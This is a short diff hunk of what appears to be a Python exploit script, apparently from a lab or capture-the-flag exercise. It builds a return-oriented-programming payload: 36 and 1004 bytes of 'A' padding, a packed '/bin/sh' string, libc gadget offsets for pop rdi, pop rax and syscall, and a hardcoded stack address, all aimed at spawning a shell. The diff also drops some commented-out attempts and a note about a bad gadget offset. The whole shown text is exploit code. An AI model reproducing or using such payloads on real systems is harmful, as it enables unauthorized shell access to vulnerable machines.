@@ -15,13 +15,8 @@ g3 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
 d4 = 0x7fffffffe154 #address of /bin/sh on the stack
 retStringRev = 0x0068732f6e69622f
 g4 = 0x7ffff7b9476b #syscall
-
-# removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
-shellcode =''
-# for i in range(1,37) :
+shellcode = ''
 shellcode += 'A'*(36)
-# shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
-# shellcode += struct.pack('<p',"'/bin/sh',0")
 shellcode += struct.pack('<q', retStringRev)
 shellcode += 'A'*(1004)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
